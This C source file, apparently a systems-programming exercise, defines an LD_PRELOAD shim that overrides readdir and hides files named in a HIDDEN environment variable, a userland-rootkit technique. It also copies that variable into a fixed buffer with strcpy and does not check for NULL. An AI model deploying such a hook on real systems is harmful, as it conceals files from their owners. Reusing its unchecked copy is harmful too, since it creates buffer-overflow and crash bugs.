#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h> 
#include <dlfcn.h>
#include <string.h>


// code for readdir goes here
 struct dirent *readdir(DIR *dirp) {

	const char delim[2] = ":";
	char envVar[1000];

    struct dirent *(*original_readdir)(DIR *);

    original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *de = original_readdir(dirp);
	while(de != NULL) {
		int hidden = 0;
		
		char* excludedFiles = getenv("HIDDEN");
		strcpy(envVar, excludedFiles);
		
		char *token = strtok(envVar, delim);
		while(token != NULL) {
			if(strcmp(de->d_name, token) == 0) {
				hidden = 1;
				break;
			}
			token = strtok(NULL, delim);
		}
		
		if(!hidden) {
			break;
		}
		de = original_readdir(dirp);
	}

	return de;
 }
